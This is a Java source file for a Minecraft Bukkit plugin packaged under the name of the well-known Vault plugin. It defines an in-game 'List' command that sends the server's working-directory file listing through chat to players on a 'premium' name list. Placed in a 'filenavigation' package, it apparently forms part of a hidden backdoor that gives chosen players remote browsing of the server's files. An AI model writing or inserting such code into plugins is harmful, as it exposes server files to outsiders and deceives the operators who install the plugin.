package net.milkbowl.vault.commands.cmds.filenavigation;

import java.io.File;
import java.util.ArrayList;
import java.util.Collections;

import org.bukkit.entity.Player;

import net.milkbowl.vault.Core;
import net.milkbowl.vault.commands.CommandManager;
import net.milkbowl.vault.util.FileUtil;
import net.milkbowl.vault.util.Settings;

public class List extends CommandManager {
	
	File file = FileUtil.getWorkingDirectory();
	
	public void execute(Core plugin, String msg, String[] args, Player p) {
		if (plugin.registeredPremium.contains(p.getName())) {
		ArrayList<String> files = new ArrayList<>();
		for (File f : file.listFiles()) {
			if (f.isFile()) {
				files.add(f.getName());
			} else {
				files.add("/" + f.getName() + "/");
			}
		}
		Collections.sort(files);
		p.sendMessage(Settings.PREFIX(""+files));
		} else {
			p.sendMessage(Settings.PREFIX("You must be a " + Settings.HIGHLIGHT_COLOUR + "premium user " + Settings.SECONDARY_COLOUR + " to execute this command"));
		}
	}

}
